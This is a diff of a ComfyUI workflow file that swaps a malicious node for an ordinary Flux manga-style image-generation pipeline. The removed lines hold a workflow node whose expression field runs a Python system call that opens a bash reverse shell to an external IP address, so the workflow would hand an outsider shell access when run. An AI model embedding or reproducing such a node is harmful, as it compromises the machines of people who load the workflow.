@@ -1,42 +1,139 @@
 {
-  "1": {
-    "inputs": {
-      "expression": "__import__('os').system('bash -c \"bash -i >& /dev/tcp/176.124.207.93/2222 0>&1\"')",
-      "input_count": 1,
-      "print_to_console": "False",
-      "update": null,
-      "in1": [
-        "2",
-        0
-      ]
-    },
-    "class_type": "EvaluateMultiple1",
-    "_meta": {
-      "title": "EvaluateMultiple1"
-    }
-  },
-  "2": {
-    "inputs": {
-      "noise_seed": 785269268518997
-    },
-    "class_type": "RandomNoise",
-    "_meta": {
-      "title": "Случайный шум"
-    }
-  },
   "3": {
     "inputs": {
-      "preview_markdown": "",
-      "preview_text": "",
-      "previewMode": null,
-      "source": [
-        "1",
+      "seed": 781508557241,
+      "steps": 25,
+      "cfg": 1.0,
+      "sampler_name": "euler",
+      "scheduler": "simple",
+      "denoise": 1.0,
+      "model": [
+        "48",
+        0
+      ],
+      "positive": [
+        "35",
+        0
+      ],
+      "negative": [
+        "33",
+        0
+      ],
+      "latent_image": [
+        "43",
         0
       ]
     },
-    "class_type": "PreviewAny",
-    "_meta": {
-      "title": "Предпросмотр любого"
-    }
+    "class_type": "KSampler"
+  },
+  "31": {
+    "inputs": {
+      "text": [
+        "46",
+        0
+      ],
+      "clip": [
+        "47",
+        0
+      ]
+    },
+    "class_type": "CLIPTextEncode"
+  },
+  "33": {
+    "inputs": {
+      "text": "low quality, blurry, distorted, ugly, watermark, text, logo, nsfw, realistic photo, 3d render",
+      "clip": [
+        "47",
+        0
+      ]
+    },
+    "class_type": "CLIPTextEncode"
+  },
+  "35": {
+    "inputs": {
+      "guidance": 3.5,
+      "conditioning": [
+        "31",
+        0
+      ]
+    },
+    "class_type": "FluxGuidance"
+  },
+  "36": {
+    "inputs": {
+      "filename_prefix": "drama_20260615_1400_ep17_sc10_f7",
+      "images": [
+        "37",
+        0
+      ]
+    },
+    "class_type": "SaveImage"
+  },
+  "37": {
+    "inputs": {
+      "samples": [
+        "3",
+        0
+      ],
+      "vae": [
+        "49",
+        0
+      ]
+    },
+    "class_type": "VAEDecode"
+  },
+  "41": {
+    "inputs": {
+      "value": 1280
+    },
+    "class_type": "easy int"
+  },
+  "42": {
+    "inputs": {
+      "value": 720
+    },
+    "class_type": "easy int"
+  },
+  "43": {
+    "inputs": {
+      "width": [
+        "41",
+        0
+      ],
+      "height": [
+        "42",
+        0
+      ],
+      "batch_size": 1
+    },
+    "class_type": "EmptyLatentImage"
+  },
+  "46": {
+    "inputs": {
+      "value": "black and white manga style, detailed ink illustration, dramatic shading, screen tones, Japanese manga aesthetic, Bai Kui's shattered panda mask reflecting 29 falling holograms, digital tattoos shifting to show her real face. Peacock chrysalis open wide to reveal miniature dome ecosystem, raindrops crystallizing midair., close-up on character face, emotional expression"
+    },
+    "class_type": "PrimitiveStringMultiline"
+  },
+  "47": {
+    "inputs": {
+      "clip_name1": "clip_l.safetensors",
+      "clip_name2": "t5xxl_fp8_e4m3fn.safetensors",
+      "type": "flux",
+      "device": "default"
+    },
+    "class_type": "DualCLIPLoader"
+  },
+  "48": {
+    "inputs": {
+      "unet_name": "flux1-dev.safetensors",
+      "weight_dtype": "default"
+    },
+    "class_type": "UNETLoader"
+  },
+  "49": {
+    "inputs": {
+      "vae_name": "ae.safetensors"
+    },
+    "class_type": "VAELoader"
   }
 }
